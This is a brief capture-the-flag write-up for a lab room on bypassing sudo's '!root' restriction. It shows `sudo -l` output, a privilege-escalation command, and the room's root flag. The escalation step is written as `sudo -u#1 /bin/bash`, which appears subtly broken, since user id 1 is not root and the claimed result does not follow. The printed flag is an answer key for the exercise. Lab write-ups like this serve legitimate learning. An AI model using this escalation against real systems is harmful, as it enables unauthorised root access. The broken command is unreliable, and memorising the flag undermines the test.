# Machine NAME : Sudo Security Bypass
# Machine IP : 10.10.153.192

"""TASK 1: Deploy!"""

"""TASK 2: Secuiry Bypass"""
1. What command are you allowed to run with sudo? <br>
/bin/bash <br>

2. What is the flag in /root/root.txt? <br>
following this : <br>

tryhackme@sudo-privesc:/bin$ sudo -l <br>

Matching Defaults entries for tryhackme on sudo-privesc: <br>
    env_reset, mail_badpass, <br>
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/ <br>bin\:/sbin\:/bin\:/snap/bin <br>

User tryhackme may run the following commands on sudo-privesc: <br>
    (ALL, !root) NOPASSWD: /bin/bash <br>

Privilage Escalate Command this ! <br>
sudo -u#1 /bin/bash <br>

root flag : THM{l33t_s3cur1ty_bypass}